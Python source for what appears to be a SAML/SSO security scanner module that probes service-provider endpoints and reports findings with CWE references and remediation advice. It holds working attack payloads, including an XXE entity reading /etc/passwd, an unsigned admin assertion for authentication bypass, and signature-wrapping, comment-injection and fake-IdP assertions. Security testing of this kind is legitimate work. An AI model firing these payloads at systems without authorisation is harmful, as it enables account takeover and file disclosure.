"""
SAML Security Scanner.
Tests for SAML/SSO Federation vulnerabilities.
"""

from __future__ import annotations

import base64
import re
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, parse_qs, urlparse, quote

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class SAMLScanner(ScanModule):
    """
    SAML Security Scanner for SSO/Federation.
    
    Tests for:
    - XML Signature Wrapping (XSW)
    - SAML Response manipulation
    - Assertion replay attacks
    - Comment injection
    - Certificate issues
    - IdP confusion
    - Destination validation bypass
    - Audience restriction bypass
    - Time-based attacks (NotBefore/NotOnOrAfter)
    - Signature exclusion
    """
    
    name = "saml_scanner"
    
    # SAML endpoints
    SAML_ENDPOINTS = [
        "/saml/acs",
        "/saml/consume",
        "/saml/callback",
        "/saml/sso",
        "/saml/login",
        "/saml/auth",
        "/sso/saml",
        "/sso/callback",
        "/auth/saml/callback",
        "/api/saml/acs",
        "/api/auth/saml",
        "/simplesaml/module.php/saml/sp/saml2-acs.php",
        "/adfs/ls",
        "/adfs/ls/",
        "/_saml",
        "/saml2/acs",
        "/saml2",
    ]
    
    # SAML metadata endpoints
    METADATA_ENDPOINTS = [
        "/saml/metadata",
        "/saml/metadata.xml",
        "/saml/sp/metadata",
        "/sso/metadata",
        "/api/saml/metadata",
        "/simplesaml/module.php/saml/sp/metadata.php",
        "/FederationMetadata/2007-06/FederationMetadata.xml",
    ]
    
    # SAML IdP discovery
    IDP_DISCOVERY = [
        "/saml/discovery",
        "/saml/idp-discovery",
        "/discovery",
        "/sso/discovery",
    ]
    
    def __init__(self, settings: Settings) -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Scan for SAML security vulnerabilities."""
        findings: list[Finding] = []
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        
        async with httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            # Discover SAML endpoints
            saml_endpoints = await self._discover_saml_endpoints(
                client, base_url, rate_limiter
            )
            
            if not saml_endpoints:
                logger.info(f"No SAML endpoints found for {host}")
                return findings
            
            # Check SAML metadata exposure
            metadata_findings = await self._test_metadata_exposure(
                client, base_url, rate_limiter
            )
            findings.extend(metadata_findings)
            
            # Test XML Signature Wrapping
            xsw_findings = await self._test_signature_wrapping(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(xsw_findings)
            
            # Test SAML Response manipulation
            response_findings = await self._test_response_manipulation(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(response_findings)
            
            # Test signature exclusion
            sig_findings = await self._test_signature_exclusion(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(sig_findings)
            
            # Test comment injection
            comment_findings = await self._test_comment_injection(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(comment_findings)
            
            # Test assertion replay
            replay_findings = await self._test_assertion_replay(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(replay_findings)
            
            # Test IdP confusion
            idp_findings = await self._test_idp_confusion(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(idp_findings)
            
            # Test XXE in SAML
            xxe_findings = await self._test_saml_xxe(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(xxe_findings)
        
        return findings
    
    async def _discover_saml_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """Discover SAML endpoints."""
        endpoints = []
        
        all_endpoints = self.SAML_ENDPOINTS + self.METADATA_ENDPOINTS + self.IDP_DISCOVERY
        
        for path in all_endpoints:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, path)
                response = await client.get(url, follow_redirects=False)
                
                # Check for SAML indicators
                if response.status_code != 404:
                    # Check response content for SAML indicators
                    content = response.text.lower()
                    if any(ind in content for ind in [
                        "saml", "entityid", "assertionconsumerservice",
                        "singlesignonservice", "x509certificate"
                    ]) or response.status_code in [200, 302, 400]:
                        endpoints.append(url)
                        logger.info(f"SAML endpoint found: {url}")
                        
            except Exception as e:
                logger.debug(f"Error checking SAML endpoint {path}: {e}")
        
        return endpoints
    
    async def _test_metadata_exposure(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Check SAML metadata exposure and configuration."""
        findings = []
        
        for path in self.METADATA_ENDPOINTS:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, path)
                response = await client.get(url)
                
                if response.status_code == 200 and "xml" in response.headers.get("content-type", ""):
                    findings.append(Finding(
                        name="SAML Metadata Exposed",
                        severity="INFO",
                        confidence="HIGH",
                        description="SAML SP metadata is publicly accessible",
                        matched_at=url,
                        evidence=["SAML metadata XML returned"],
                        cwe="CWE-200",
                        remediation="Review if metadata should be public. "
                                   "Ensure sensitive configuration is not exposed.",
                    ))
                    
                    # Parse and check metadata
                    try:
                        root = ET.fromstring(response.text)
                        
                        # Check for certificate exposure
                        if "X509Certificate" in response.text:
                            findings.append(Finding(
                                name="SAML Certificate in Metadata",
                                severity="INFO",
                                confidence="HIGH",
                                description="X509 certificate exposed in SAML metadata",
                                matched_at=url,
                                evidence=["Certificate found in metadata"],
                                cwe="CWE-200",
                                remediation="This is normal but verify certificate is not private key.",
                            ))
                        
                        # Check for weak encryption
                        if "http://www.w3.org/2001/04/xmlenc#tripledes-cbc" in response.text:
                            findings.append(Finding(
                                name="Weak Encryption in SAML",
                                severity="MEDIUM",
                                confidence="HIGH",
                                description="SAML metadata specifies weak encryption (3DES)",
                                matched_at=url,
                                evidence=["Triple-DES encryption algorithm found"],
                                cwe="CWE-327",
                                cvss_score=5.3,
                                remediation="Use AES-256 or stronger encryption.",
                            ))
                            
                        # Check for SHA-1
                        if "http://www.w3.org/2000/09/xmldsig#sha1" in response.text:
                            findings.append(Finding(
                                name="Weak Hash Algorithm in SAML (SHA-1)",
                                severity="MEDIUM",
                                confidence="HIGH",
                                description="SAML uses SHA-1 which is cryptographically weak",
                                matched_at=url,
                                evidence=["SHA-1 algorithm in SAML configuration"],
                                cwe="CWE-328",
                                cvss_score=5.3,
                                remediation="Upgrade to SHA-256 or SHA-512.",
                            ))
                            
                    except ET.ParseError:
                        pass
                        
            except Exception as e:
                logger.debug(f"Error checking metadata: {e}")
        
        return findings
    
    async def _test_signature_wrapping(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XML Signature Wrapping (XSW) attacks."""
        findings = []
        
        # XSW attack payloads - different wrapping techniques
        # These are informational as full XSW requires valid signatures
        xsw_indicators = [
            "XML Signature Wrapping",
            "The response contains multiple assertions",
            "Signature verification",
        ]
        
        # Create a malformed SAML response with duplicate structures
        malformed_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_malformed" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Assertion ID="_original">
        <saml:Subject>
            <saml:NameID>victim@example.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
    <saml:Assertion ID="_injected">
        <saml:Subject>
            <saml:NameID>attacker@evil.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded_saml = base64.b64encode(malformed_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    # Test POST binding
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded_saml},
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    )
                    
                    # Check response for XSW indicators
                    if response.status_code != 500:
                        # If server didn't reject outright
                        if "multiple" in response.text.lower() or \
                           "assertion" in response.text.lower():
                            findings.append(Finding(
                                name="Potential XSW Vulnerability - Manual Test Required",
                                severity="HIGH",
                                confidence="LOW",
                                description="Server processed SAML with multiple assertions. "
                                           "Manual testing required for XML Signature Wrapping.",
                                matched_at=endpoint,
                                evidence=[
                                    "Multiple assertion SAML was processed",
                                    "XSW attack surface detected",
                                ],
                                cwe="CWE-347",
                                cvss_score=8.1,
                                remediation="Implement strict signature validation. "
                                           "Ensure only signed assertions are trusted. "
                                           "Use XPath to validate exact assertion location.",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing XSW: {e}")
        
        return findings
    
    async def _test_response_manipulation(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test SAML response manipulation."""
        findings = []
        
        # Test various SAML manipulation scenarios
        manipulations = [
            # Destination manipulation
            {
                "name": "Destination Bypass",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            Destination="https://evil.com/acs" ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
            # InResponseTo manipulation
            {
                "name": "InResponseTo Bypass",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            InResponseTo="_fake_request_id" ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
            # Missing IssueInstant
            {
                "name": "Missing Timestamp",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
        ]
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                for manipulation in manipulations:
                    await rate_limiter.acquire()
                    
                    try:
                        encoded = base64.b64encode(manipulation["saml"].encode()).decode()
                        
                        response = await client.post(
                            endpoint,
                            data={"SAMLResponse": encoded},
                        )
                        
                        # Check if manipulation was accepted
                        if response.status_code in [200, 302]:
                            findings.append(Finding(
                                name=f"SAML {manipulation['name']} Possible",
                                severity="HIGH",
                                confidence="MEDIUM",
                                description=f"SAML endpoint may not properly validate {manipulation['name']}",
                                matched_at=endpoint,
                                evidence=[
                                    f"Manipulation type: {manipulation['name']}",
                                    f"Response status: {response.status_code}",
                                ],
                                cwe="CWE-287",
                                cvss_score=8.1,
                                remediation="Implement strict SAML response validation.",
                            ))
                            
                    except Exception as e:
                        logger.debug(f"Error testing manipulation: {e}")
        
        return findings
    
    async def _test_signature_exclusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test if unsigned SAML responses are accepted."""
        findings = []
        
        # Unsigned SAML assertion
        unsigned_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_unsigned_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="_unsigned_assertion" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                admin@example.com
            </saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z">
            <saml:AudienceRestriction>
                <saml:Audience>https://sp.example.com</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:Password
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(unsigned_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # Check for authentication success indicators
                    success_indicators = [
                        "welcome", "dashboard", "logged in", "session",
                        "authenticated", "success"
                    ]
                    
                    if response.status_code in [200, 302]:
                        response_text = response.text.lower()
                        
                        if any(ind in response_text for ind in success_indicators) or \
                           (response.status_code == 302 and "login" not in response.headers.get("location", "").lower()):
                            findings.append(Finding(
                                name="Unsigned SAML Response Accepted",
                                severity="CRITICAL",
                                confidence="HIGH",
                                description="SAML endpoint accepts unsigned assertions. "
                                           "Full authentication bypass possible.",
                                matched_at=endpoint,
                                evidence=[
                                    "Unsigned SAML assertion accepted",
                                    f"Response: {response.status_code}",
                                ],
                                cwe="CWE-347",
                                cvss_score=9.8,
                                remediation="ALWAYS require and validate XML signatures. "
                                           "Reject any unsigned SAML assertions.",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing signature exclusion: {e}")
        
        return findings
    
    async def _test_comment_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for SAML comment injection (CVE-2017-11427 style)."""
        findings = []
        
        # Comment injection to bypass email validation
        # The signature is over "user@example.com" but parser sees "user@evil.com"
        comment_injection_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_comment_test" Version="2.0">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>user@example.com<!---->.evil.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(comment_injection_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # Check if comment was processed
                    if response.status_code not in [400, 500]:
                        findings.append(Finding(
                            name="SAML Comment Injection Possible",
                            severity="HIGH",
                            confidence="LOW",
                            description="SAML endpoint may be vulnerable to comment injection "
                                       "(CVE-2017-11427 style attack)",
                            matched_at=endpoint,
                            evidence=[
                                "Comment-injected SAML was processed",
                                "Manual verification required",
                            ],
                            cwe="CWE-91",
                            cvss_score=8.1,
                            remediation="Use XML canonicalization before signature verification. "
                                       "Update SAML libraries to latest versions.",
                        ))
                        
                except Exception as e:
                    logger.debug(f"Error testing comment injection: {e}")
        
        return findings
    
    async def _test_assertion_replay(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for SAML assertion replay attacks."""
        findings = []
        
        # Test with old timestamp - should be rejected
        old_timestamp = (datetime.utcnow() - timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%SZ")
        
        old_saml = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_old_test" Version="2.0" IssueInstant="{old_timestamp}">
    <saml:Assertion ID="_old_assertion" IssueInstant="{old_timestamp}">
        <saml:Conditions NotBefore="{old_timestamp}" NotOnOrAfter="{old_timestamp}">
        </saml:Conditions>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(old_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # If old assertion wasn't rejected
                    if response.status_code not in [400, 403, 500]:
                        if "expired" not in response.text.lower() and \
                           "invalid" not in response.text.lower():
                            findings.append(Finding(
                                name="SAML Assertion Replay Possible",
                                severity="HIGH",
                                confidence="MEDIUM",
                                description="SAML endpoint may accept expired assertions. "
                                           "Replay attacks possible.",
                                matched_at=endpoint,
                                evidence=[
                                    f"30-day old assertion not rejected",
                                    f"Status: {response.status_code}",
                                ],
                                cwe="CWE-294",
                                cvss_score=7.4,
                                remediation="Implement strict NotOnOrAfter validation. "
                                           "Store and check assertion IDs for replay.",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing replay: {e}")
        
        return findings
    
    async def _test_idp_confusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for IdP confusion attacks."""
        findings = []
        
        # Try with unknown/malicious IdP issuer
        fake_idp_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_idp_test" Version="2.0">
    <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
    <saml:Assertion>
        <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID>admin@target.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(fake_idp_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # If unknown IdP wasn't immediately rejected
                    if response.status_code not in [400, 403, 500]:
                        if "unknown" not in response.text.lower() and \
                           "invalid issuer" not in response.text.lower():
                            findings.append(Finding(
                                name="SAML IdP Confusion Possible",
                                severity="HIGH",
                                confidence="LOW",
                                description="SP may not properly validate IdP issuer. "
                                           "IdP confusion attack possible.",
                                matched_at=endpoint,
                                evidence=[
                                    "Unknown IdP issuer not rejected",
                                    "Manual verification required",
                                ],
                                cwe="CWE-287",
                                cvss_score=8.1,
                                remediation="Implement strict IdP issuer validation. "
                                           "Maintain allowlist of trusted IdPs.",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing IdP confusion: {e}")
        
        return findings
    
    async def _test_saml_xxe(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XXE in SAML processing."""
        findings = []
        
        # XXE payload in SAML
        xxe_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xxe_test" Version="2.0">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(xxe_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # Check for XXE indicators
                    if "root:" in response.text or "/bin/bash" in response.text:
                        findings.append(Finding(
                            name="XXE in SAML Processing",
                            severity="CRITICAL",
                            confidence="HIGH",
                            description="SAML processor is vulnerable to XML External Entity injection",
                            matched_at=endpoint,
                            evidence=[
                                "XXE payload executed",
                                "File contents in response",
                            ],
                            cwe="CWE-611",
                            cvss_score=9.1,
                            remediation="Disable external entity processing. "
                                       "Use secure XML parser configuration.",
                        ))
                    elif response.status_code not in [400, 500]:
                        # DTD was processed without immediate error
                        findings.append(Finding(
                            name="SAML XXE - DTD Processing Enabled",
                            severity="HIGH",
                            confidence="MEDIUM",
                            description="SAML processor may allow DTD/entity processing",
                            matched_at=endpoint,
                            evidence=["XXE payload not rejected immediately"],
                            cwe="CWE-611",
                            cvss_score=7.5,
                            remediation="Disable DTD and external entity processing.",
                        ))
                        
                except Exception as e:
                    logger.debug(f"Error testing XXE: {e}")
        
        return findings
